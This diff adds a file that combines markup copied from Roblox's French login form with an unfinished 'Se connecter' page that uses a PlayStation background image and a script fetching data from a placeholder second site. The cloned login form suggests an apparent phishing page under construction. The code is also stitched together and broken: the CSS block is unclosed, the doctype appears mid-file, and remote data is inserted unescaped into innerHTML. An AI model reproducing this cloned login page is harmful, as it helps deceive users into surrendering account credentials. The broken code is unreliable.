@@ -1,0 +1,32 @@
+<div class="section-content login-section"><h1 class="login-header">Connexion à Roblox</h1><div id="login-form"><div><div class="login-form-container"><form class="login-form" name="loginForm"><div class="form-group username-form-group"><label for="login-username" class="sr-only">Identifiant/E-mail/Téléphone</label><input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="Identifiant/E-mail/Téléphone" value=""></div><div class="form-group password-form-group"><label for="login-password" class="sr-only">Mot de passe</label><input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Mot de passe" value=""><div aria-live="polite"></div></div><button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">Connexion</button></form></div></div></div><div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Mot de passe ou nom d'utilisateur oublié&nbsp;?</a></div><div><div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div></div><button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">Envoyez-moi un code unique par email</button><button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Connexion rapide</span></button></div><div id="crossDeviceLoginDisplayCodeModal-container"></div><div id="otp-login-container"></div><div id="account-switcher-confirmation-modal-container"></div><div class="text-center"><div class="signup-option"><span class="no-account-text">Vous n'avez pas de compte&nbsp;?</span><a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/fr/account/signupredir?ReturnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fupgrades%2Frobux%3Fctx%3Dnavpopover" target="_self">S'inscrire</a></div></div></div>
+     <!DOCTYPE html>
+<html>
+<head>
+  <title>Se connecter</title>
+  <style>
+    /* 1. L'image en fond plein écran */
+    body {
+      margin: 0;
+      padding: 0;
+      background: url(https://image.api.playstation.com/vulcan/ap/rnd/202604/0801/6157a74f216f5fd380f33d326132130e6d1d7578291da74c.png) no-repeat center center fixed;
+      color: white; /* Titres, paragraphes et liens en blanc */
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid white;
+      border-radius: 5px;
+      background: rgba(255,255,255,0.1);
+      color: white
+	 <script>
+  // Ton site A appelle ton site B
+  fetch("https://ton-autre-site.com/api/data")
+    .then(response => response.json())
+    .then(data => {
+      console.log("Réponse du site B:", data);
+      document.body.innerHTML += "<p>" + data.message + "</p>";
+    })
+    .catch(error => console.error("Erreur:", error));
+</script>
